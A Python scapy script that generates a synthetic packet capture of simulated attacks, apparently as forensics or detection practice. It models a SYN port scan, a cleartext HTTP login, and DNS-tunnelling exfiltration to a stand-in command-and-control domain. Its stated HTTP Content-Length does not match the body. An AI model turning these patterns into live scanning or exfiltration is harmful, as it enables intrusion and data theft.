import sys
from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, wrpcap

packets = []
attacker_ip = "192.168.1.105"
target_ip = "192.168.1.50"

print("[+] Generating Scenario 1: TCP SYN Port Scan...")
for port in range(20, 30):
    syn_pkt = IP(src=attacker_ip, dst=target_ip)/TCP(sport=54321, dport=port, flags="S")
    packets.append(syn_pkt)

print("[+] Generating Scenario 2: Cleartext Credential Exfiltration (HTTP)...")
http_payload = (
    "POST /login.php HTTP/1.1\r\n"
    "Host: target-internal.com\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 45\r\n\r\n"
    "username=admin_user&password=SuperSecretPassword123!"
)
http_pkt = IP(src=attacker_ip, dst=target_ip)/TCP(sport=49152, dport=80, flags="PA")/Raw(load=http_payload)
packets.append(http_pkt)

print("[+] Generating Scenario 3: DNS Tunneling Exfiltration...")
encoded_data_subdomains = [
    "c2VjcmV0X2ZpbGUucGRm.malicious-c2-domain.com",
    "dG9wX3NlY3JldF9kYXRh.malicious-c2-domain.com"
]
for sub in encoded_data_subdomains:
    dns_pkt = IP(src=attacker_ip, dst="8.8.8.8")/UDP(sport=53535, dport=53)/DNS(rd=1, qd=DNSQR(qname=sub))
    packets.append(dns_pkt)

output_file = "evidence_capture.pcap"
wrpcap(output_file, packets)
print(f"[✔] Successfully created capture file: {output_file}")
